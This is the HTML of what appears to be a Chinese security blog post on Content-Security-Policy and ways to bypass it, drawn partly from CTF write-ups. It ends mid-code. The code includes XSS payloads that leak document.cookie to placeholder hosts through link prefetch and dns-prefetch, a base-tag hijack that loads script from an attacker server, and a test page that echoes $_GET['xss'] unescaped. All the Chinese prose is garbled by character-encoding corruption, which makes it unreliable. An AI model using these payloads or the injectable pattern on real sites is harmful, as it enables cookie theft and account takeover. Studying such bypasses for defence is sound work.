
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>ç¦»æ€€ç§‹</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="ç¦»æ€€ç§‹">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="ç¦»æ€€ç§‹">
<meta property="article:author" content="ç¦»æ€€ç§‹">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="ç¦»æ€€ç§‹" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
<link rel="stylesheet" href="/css/style.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 4.2.1"></head>
<body>
<div id="container">
  <div id="wrap">
    <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">ç¦»æ€€ç§‹</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">å¿ƒæœªæ­» æˆ˜æœªè´¥</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
          <input type="submit" value="" class="search-form-submit">
          <input name=tn type=hidden value="bds">
          <input name=cl type=hidden value="3">
          <input name=ct type=hidden value="2097152">
          <input type="hidden" name="si" value="yoursite.com">
        </form>
      </div>
    </div>
  </div>
</header>
    <div class="outer">
      <section id="main">
  
    <article id="post-CSP-CSP-Bypass" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/31/CSP-CSP-Bypass/" class="article-date">
  <time datetime="2019-10-31T08:09:22.000Z" itemprop="datePublished">2019-10-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/31/CSP-CSP-Bypass/">CSP &amp; CSP-Bypass</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>çœ‹äº†ROISçš„XCTF Final wpçœŸçš„æ„Ÿè§‰è‡ªå·±â€¦ä¼šçš„å¤ªå°‘äº†â€¦ï¼ŒåŒæ—¶æ„Ÿè§‰åœ¨ç”Ÿæ´»ä¸­æŠŠä¸ªäººæƒ…æ„Ÿå’Œä¸ªäººå­¦ä¹ åˆ†å¼€çš„èƒ½åŠ›æ˜¯çœŸçš„é‡è¦(ç»ˆäºé‡åˆ°äº†é‚£ä¸ªå¯çˆ±çš„å¥¹äº†ï¼Œå¸Œæœ›ä¸€åˆ‡é¡ºåˆ©ï¼‰ï¼ŒåŠªåŠ›é”»ç‚¼è‡ªå·±çš„å„ä¸ªæ–¹é¢èƒ½åŠ›å§ï¼Œå¸Œæœ›å¯ä»¥å˜å¾—ä¼˜ç§€ä¸€äº›ã€‚</p>
<h3 id="CSPç®€ä»‹"><a href="#CSPç®€ä»‹" class="headerlink" title="CSPç®€ä»‹"></a>CSPç®€ä»‹</h3><p>åœ¨äº†è§£cspçš„bypassæ“ä½œä¹‹å‰ï¼Œéœ€è¦å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯cspã€‚</p>
<blockquote>
<p>CSP çš„ä¸»è¦ç›®æ ‡æ˜¯å‡å°‘å’ŒæŠ¥å‘Š XSS æ”»å‡» ï¼ŒXSS æ”»å‡»åˆ©ç”¨äº†æµè§ˆå™¨å¯¹äºä»æœåŠ¡å™¨æ‰€è·å–çš„å†…å®¹çš„ä¿¡ä»»ã€‚æ¶æ„è„šæœ¬åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­å¾—ä»¥è¿è¡Œï¼Œå› ä¸ºæµè§ˆå™¨ä¿¡ä»»å…¶å†…å®¹æ¥æºï¼Œå³ä½¿æœ‰çš„æ—¶å€™è¿™äº›è„šæœ¬å¹¶éæ¥è‡ªäºå®ƒæœ¬è¯¥æ¥çš„åœ°æ–¹ã€‚</p>
<p>CSPé€šè¿‡æŒ‡å®šæœ‰æ•ˆåŸŸâ€”â€”å³æµè§ˆå™¨è®¤å¯çš„å¯æ‰§è¡Œè„šæœ¬çš„æœ‰æ•ˆæ¥æºâ€”â€”ä½¿æœåŠ¡å™¨ç®¡ç†è€…æœ‰èƒ½åŠ›å‡å°‘æˆ–æ¶ˆé™¤XSSæ”»å‡»æ‰€ä¾èµ–çš„è½½ä½“ã€‚ä¸€ä¸ªCSPå…¼å®¹çš„æµè§ˆå™¨å°†ä¼šä»…æ‰§è¡Œä»ç™½åå•åŸŸè·å–åˆ°çš„è„šæœ¬æ–‡ä»¶ï¼Œå¿½ç•¥æ‰€æœ‰çš„å…¶ä»–è„šæœ¬ (åŒ…æ‹¬å†…è”è„šæœ¬å’ŒHTMLçš„äº‹ä»¶å¤„ç†å±æ€§)ã€‚</p>
<p>ä½œä¸ºä¸€ç§ç»ˆæé˜²æŠ¤å½¢å¼ï¼Œå§‹ç»ˆä¸å…è®¸æ‰§è¡Œè„šæœ¬çš„ç«™ç‚¹å¯ä»¥é€‰æ‹©å…¨é¢ç¦æ­¢è„šæœ¬æ‰§è¡Œã€‚</p>
</blockquote>
<h3 id="å¸¸è§çš„CSPå£°æ˜"><a href="#å¸¸è§çš„CSPå£°æ˜" class="headerlink" title="å¸¸è§çš„CSPå£°æ˜"></a>å¸¸è§çš„CSPå£°æ˜</h3><h4 id="æŒ‡ä»¤ä¸å†…å®¹æº"><a href="#æŒ‡ä»¤ä¸å†…å®¹æº" class="headerlink" title="æŒ‡ä»¤ä¸å†…å®¹æº"></a>æŒ‡ä»¤ä¸å†…å®¹æº</h4><p>CSPä¸»è¦æœ‰ä¸‰ä¸ªheaderï¼Œåˆ†åˆ«æ˜¯ï¼šContent-Security-Policyï¼ŒX-Content-Security-Policyï¼ŒX-WebKit-CSPã€‚</p>
<p>å¹³æ—¶æœ€ä¸ºå¸¸è§çš„æ˜¯Content Security Policy</p>
<p>æˆ‘ä»¬å¯¹CSPçš„å¯åŠ¨è°ƒç”¨æœ‰ä¸¤ç§æ–¹æ³•</p>
<ul>
<li>HTTPå¤´ä¿¡æ¯çš„Content-Security-Policyå­—æ®µ</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡ç½‘é¡µçš„metaæ ‡ç­¾æ¥å®šä¹‰</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»ä¸Šé¢çš„ä¸¤ç§CSPå£°æ˜æ–¹æ³•æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ä¸€ä¸ªCSPå¤´æ˜¯ç”±å¤šç»„CSPç­–ç•¥ç»„æˆçš„ï¼Œå¹¶ä¸”ä¸­é—´ç”±åˆ†å·ç›¸éš”ï¼Œæ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ï¼Œç­–ç•¥æŒ‡ä»¤å¸¸è§å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>æŒ‡ä»¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>default-src</td>
<td>å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>connect-src</td>
<td>å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>font-src</td>
<td>å®šä¹‰ Font åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>frame-src</td>
<td>å®šä¹‰ Frame åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>img-src</td>
<td>å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>media-src</td>
<td>å®šä¹‰ &lt;audio&gt;ã€&lt;video&gt; ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>object-src</td>
<td>å®šä¹‰ &lt;applet&gt;ã€&lt;embed&gt;ã€&lt;object&gt; ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>script-src</td>
<td>å®šä¹‰ JS åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>style-src</td>
<td>å®šä¹‰ CSS åŠ è½½ç­–ç•¥</td>
</tr>
<tr>
<td>sandbox</td>
<td>å€¼ä¸º allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox</td>
</tr>
<tr>
<td>report-uri</td>
<td>å€¼ä¸º /report-uriï¼Œæäº¤æ—¥å¿—</td>
</tr>
</tbody></table>
<p>å†…å®¹æºå¸¸è§é€‰é¡¹å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>æº</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>é€šé…ç¬¦ï¼Œå…è®¸ä»»ä½•URLï¼Œé™¤äº†data: blob: filesystem: schemes</td>
</tr>
<tr>
<td>*.foo.com</td>
<td>å…è®¸åŠ è½½foo.comå­åŸŸçš„èµ„æº</td>
</tr>
<tr>
<td>abc.foo.com</td>
<td>åªèƒ½åŠ è½½è¿™ä¸ªåŸŸåä¸‹çš„èµ„æº</td>
</tr>
<tr>
<td><a href="https://a.com/" target="_blank" rel="noopener">https://a.com</a></td>
<td>åªèƒ½ç”¨HTTPSåŠ è½½åŸŸåä¸‹çš„èµ„æº</td>
</tr>
<tr>
<td>https:</td>
<td>é€šè¿‡HTTPSå¯ä»¥åŠ è½½ä»»æ„åŸŸåä¸‹çš„èµ„æº</td>
</tr>
<tr>
<td>â€˜noneâ€™</td>
<td>ä»£è¡¨ç©ºé›†,å³ä¸åŒ¹é…ä»»ä½•URL,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td>
</tr>
<tr>
<td>â€˜selfâ€™</td>
<td>ä»£è¡¨å’Œæ–‡æ¡£åŒæº,åŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td>
</tr>
<tr>
<td>â€˜unsafe-inlineâ€™</td>
<td>å…è®¸ä½¿ç”¨å†…è”èµ„æº,å¦‚å†…è”çš„&lt;script&gt;å…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„&lt;style&gt;å…ƒç´ ,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td>
</tr>
<tr>
<td>â€˜unsafe-evalâ€™</td>
<td>å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•,ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„</td>
</tr>
<tr>
<td>data:</td>
<td>å…è®¸data: URIä½œä¸ºå†…å®¹æ¥æº</td>
</tr>
<tr>
<td>mediastream:</td>
<td>å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æº</td>
</tr>
</tbody></table>
<p>è¡¥å……å‡ ä¸ªlorexxarå¸ˆå‚…åšå®¢ä¸­ä¸¾çš„ä¾‹å­</p>
<h4 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h4><p><strong>child-srcä¸»è¦é™åˆ¶åµŒå¥—æµè§ˆçš„éƒ¨åˆ†ï¼ˆå¦‚iframeå’Œframeæ ‡ç­¾å¼•å…¥çš„å†…å®¹ï¼‰</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ä¸¾ä¸€ä¸ªé¡µé¢çš„ä¾‹å­:</span><br><span class="line">é¦–å…ˆè®¾ç½®csp</span><br><span class="line">Content-Security-Policy: child-src https://example.com/</span><br><span class="line">è€Œä¸‹é¢çš„è¯·æ±‚ä¼šè¢«CSPæ‹¦æˆª</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"https://not-example.com"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> blockedWorker = <span class="keyword">new</span> Worker(<span class="string">"data:application/javascript,..."</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h4><p><strong>font-srcæŒ‡å®šé™åˆ¶æ‰€æœ‰è¢«åŠ è½½çš„å­—ä½“èµ„æº</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ä¸¾ä¸ªä¾‹å­:</span><br><span class="line">Content-Security-Policy: font-src https://example.com/</span><br><span class="line">ä¸‹é¢çš„è¯·æ±‚éƒ½ä¼šè¿”å›é”™è¯¯</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="keyword">@font-face</span> &#123;</span></span><br><span class="line">    font-family: "Example Font";</span><br><span class="line">    src: url("https://not-example.com/font");</span><br><span class="line">  &#125;</span><br><span class="line">  body &#123;</span><br><span class="line">    font-family: "Example Font";</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Style-src"><a href="#Style-src" class="headerlink" title="Style-src"></a>Style-src</h4><p>style-srcæŒ‡ä»¤é™åˆ¶äº†æ‰€æœ‰å¯èƒ½è¢«å¼•ç”¨çš„cssï¼ŒåŒ…æ‹¬ä¸‹é¢ä¸‰ç§å¼•ç”¨çš„csså±æ€§ï¼Œstyleä¹Ÿæœ‰ä¸ªâ€™unsafe-inlineâ€™è¿™ä¸ªå‚æ•°ï¼ŒåŒç†ä¼šå…è®¸æ‰€æœ‰çš„å†…è”cssã€‚</p>
<ul>
<li>é€šè¿‡linkæ ‡ç­¾åŠ è½½css</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href="001.css" type="text/css" rel="Stylesheet"/&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡styleæ ‡ç­¾åŠ è½½css</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.main</span>&#123; <span class="attribute">width</span>:<span class="number">1002px</span>; <span class="attribute">margin</span>:<span class="number">0</span> auto;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡@importå¼•å…¥css</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; STYLE TYPE="text/css"&gt;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"example.css"</span>;</span><br><span class="line"><span class="keyword">@import</span> <span class="string">"style/other.css"</span>;</span><br><span class="line">&lt; /STYLE&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>å†…è”æ ·å¼è¡¨</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style="font-size:10px;font-color:#ff0000"</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å°±æ˜¯default-srcå£°æ˜çš„è¦†ç›–çš„æ“ä½œï¼Œdefault-srcæ˜¯ä½œä¸ºæ‰€æœ‰å…¶ä»–æŒ‡ä»¤çš„å¤‡ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥äº§ç”Ÿè¦†ç›–çš„ç°è±¡ï¼Œæ¯”å¦‚å¦‚ä¸‹çš„cspå£°æ˜</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none'; script-src 'self'</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç¬¬äºŒæ¡å°±ä¼šè¦†ç›–æ‰ç¬¬ä¸€æ¡çš„default-srcçš„å£°æ˜ï¼Œæ‰€ä»¥è¿™æ¡CSPæœ€ç»ˆçš„æ„ä¹‰ä¸º</p>
<p><strong>script-srcåŠ è½½åŒæºçš„å¼•å…¥å†…å®¹ï¼Œå…¶ä»–çš„æ‰€æœ‰æŒ‡ä»¤éµä»default-srcçš„å£°æ˜ï¼Œä¸ºnoneã€‚</strong></p>
<h3 id="Bypass-CSP"><a href="#Bypass-CSP" class="headerlink" title="Bypass-CSP"></a>Bypass-CSP</h3><h4 id="Linkæ ‡ç­¾é¢„åŠ è½½Bypass-CSP"><a href="#Linkæ ‡ç­¾é¢„åŠ è½½Bypass-CSP" class="headerlink" title="Linkæ ‡ç­¾é¢„åŠ è½½Bypass CSP"></a>Linkæ ‡ç­¾é¢„åŠ è½½Bypass CSP</h4><p>è¿™ä¸ªå¥½åƒåªé€‚ç”¨äºè€ç‰ˆçš„æµè§ˆå™¨äº†ï¼Œæœ€æ–°ç‰ˆæœ¬çš„Googleå·²ç»å…ç–«äº†Prefech</p>
<p>csp.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self' 'unsafe-inline';"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//xxx"</span>&gt;</span> //Payload For Google</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//$&#123;cookie&#125;.vps_ip"</span>&gt;</span> //Payload For FireFox</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä»ä¸‹å›¾çœ‹å‡ºæˆ‘ä»¬çš„hrefå»è®¿é—®ä¸åŒæºçš„ç½‘ç«™ç›´æ¥è¢«defaulf-src banæ‰äº†</p>
<p><a href="https://imgchr.com/i/Kf8PyQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/29/Kf8PyQ.md.png" alt="Kf8PyQ.md.png"></a></p>
<p>ä½†æ˜¯åœ¨è€ç‰ˆæœ¬è°·æ­Œåº”è¯¥æ˜¯å¯ä»¥çš„ï¼Œæˆ‘çœ‹å¾ˆå¤šå¸ˆå‚…çš„åšå®¢éƒ½æ˜¯å†™äº†ä¸€ä¸ªè¿™æ ·çš„payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self' 'unsafe-inline';"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> i=<span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span></span><br><span class="line"><span class="actionscript">        i.setAttribute(<span class="string">'rel'</span>,<span class="string">'prefetch'</span>);</span></span><br><span class="line"><span class="javascript">        i.setAttribute(<span class="string">'href'</span>,<span class="string">'http://xx?'</span>+<span class="built_in">document</span>.cookie);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.appendChild(i);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘åœ¨è°·æ­Œæœ€æ–°ç‰ˆæœ¬çš„æµ‹è¯•æƒ…å†µæ•ˆæœå’Œä¸Šé¢çš„å›¾æ˜¯ä¸€æ ·çš„,ä¸è¿‡åœ¨default-srcæ²¡è®¾ç½®çš„æƒ…å†µä¸‹æ˜¯å¯ç”¨çš„ã€‚</p>
<h4 id="Iframe-Bypass-Csp"><a href="#Iframe-Bypass-Csp" class="headerlink" title="Iframe Bypass Csp"></a>Iframe Bypass Csp</h4><p>è¿™ä¸ªæ˜¯æœ‰ä¸€å®šçš„é™åˆ¶æ¡ä»¶äº†ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªé¡µé¢åˆ†åˆ«ä¸ºAå’ŒB,äºŒè€…åŒæºï¼Œå…¶ä¸­ä¸€ä¸ªè®¾æœ‰CSPä¿æŠ¤ï¼Œä¸€ä¸ªæ²¡æœ‰CSPä¿æŠ¤</p>
<p>Aé¡µé¢</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Bé¡µé¢</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src=<span class="string">"Aé¡µé¢"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'test'</span>).innerHTML),<span class="number">1000</span>);</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p>ä»evoaå¸ˆå‚…çš„åšå®¢å­¦åˆ°äº†,å…ˆè®¾ç½®å»¶æ—¶ç­‰å¾…iframeå­çª—å£åŠ è½½å®Œæ¯•ï¼Œå†å»è·å¾—testå…ƒç´ ã€‚</p>
<h4 id="Baseæ ‡ç­¾-Bypass-Csp"><a href="#Baseæ ‡ç­¾-Bypass-Csp" class="headerlink" title="Baseæ ‡ç­¾ Bypass Csp"></a>Baseæ ‡ç­¾ Bypass Csp</h4><p>RCTF2018éé¢„æœŸè§£ [<a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup]" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup]</a>(<a href="https://blog.cal1.cn/post/RCTF" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF</a> 2018 rBlog writeup)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºbase-uriä¸ä¼šç”¨defaultä½œä¸ºfallback,æ‰€ä»¥å¯¼è‡´æˆåŠŸxssã€‚</p>
<p><a href="https://imgchr.com/i/KffiPP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KffiPP.md.png" alt="KffiPP.md.png"></a></p>
<h4 id="æµè§ˆå™¨è¡¥å…¨Bypass-Csp"><a href="#æµè§ˆå™¨è¡¥å…¨Bypass-Csp" class="headerlink" title="æµè§ˆå™¨è¡¥å…¨Bypass Csp"></a>æµè§ˆå™¨è¡¥å…¨Bypass Csp</h4><p>CSPè®¾ç½®å¦‚ä¸‹</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure>

<p>æ–°ç‰ˆæœ¬æµè§ˆå™¨ä¼¼ä¹åˆä½¿å¾ˆå¤šæ“ä½œå¤±æ•ˆäº†ï¼Œæ¯”å¦‚</p>
<p><a href="https://imgchr.com/i/Khqla8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/Khqla8.md.png" alt="Khqla8.md.png"></a></p>
<p>è¿™ä¸ªæ˜¯ä¹‹å‰å¤§å¸ˆå‚…ä»¬åšå®¢ä¸­çš„æ“ä½œ</p>
<p>ä½†æ˜¯æˆ‘åœ¨è°·æ­Œå’Œç«ç‹ä¼¼ä¹éƒ½å¤±è´¥äº†ï¼Œæˆ‘çš„æµ‹è¯•ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-abc'"</span>&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;script nonce=<span class="string">"abc"</span>&gt;document.write(<span class="string">'CSP'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ç«ç‹ä¸‹</p>
<p><a href="https://imgchr.com/i/KhLhXn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KhLhXn.md.png" alt="KhLhXn.md.png"></a></p>
<p>æœ¬æ¥æ–‡ç« ä¸­çš„åŒå¼•å·é—­åˆå¹¶æ²¡æœ‰å‡ºç°ï¼Œå½“ç„¶è¿™æ˜¯åœ¨pæ ‡ç­¾ä¸­æ’å…¥çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰pæ ‡ç­¾çš„çº¦æŸå‘¢</p>
<p>æ¯”å¦‚evoAå¸ˆå‚…ä¸­åšå®¢ä¸­çš„ä¾‹å­</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span 